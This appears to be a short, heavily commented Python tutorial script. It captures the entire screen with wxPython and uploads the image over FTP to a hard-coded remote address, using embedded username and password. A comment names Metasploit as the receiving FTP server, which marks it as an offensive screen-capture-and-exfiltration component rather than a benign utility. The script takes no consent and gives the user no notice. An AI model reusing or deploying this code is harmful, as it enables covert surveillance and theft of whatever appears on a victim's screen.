"""
This python script will take a screenshot and send the screenshot to a remote server.
for example, it can upload the screen schot to an ftp server
"""
#We'll use the wxPython library(there are many libraries for taking screenshots, you can try your preference)
import wx
import os
import ftplib 

w = wx.App()
screen = wx.ScreenDC()
"""We then create a bitmap. What is bitmap you ask? www.google.com might help.
Typically, in this case it can be seen as the size of the screen
"""
size = screen.GetSize()
bmap = wx.Bitmap(size[0], size[1])
#We initiate a memory device context to draw graphics onto the bitmap we just created
memory = wx.MemoryDC(bmap)
#copying the previously defined script into the context
memory.Blit(0,0,size[0],size[1],screen,0,0)
"""The first two zeros indicate the X and Y positions of the destination device.
Then the height(size[0]) and width (size[1]) we copy.
Then the source we're copying from, that is screen.
Then the X and Y of the source we are to copy from.
"""


del memory   #After which we delete the memory, cause we don't need it anymore
bmap.SaveFile("grabbed.png", wx.BITMAP_TYPE_PNG)

#Sending the image through FTP. You'll have to specify the IP of the machine, username and password for the ftp
session_ = ftplib.FTP("192.168.0.1", "ftpadmin", "ftpimage")
#We'll use metasploit as the ftp server
file = open("grabbed.png", "rb") #opening the file in binary mode(rb)
session_.storbinary("STOR /tmp/grabbed.png", file) #storing the image in /tmp form file

#Good practice dictates closing both the file and session before terminating
file.close()
session_.quit()
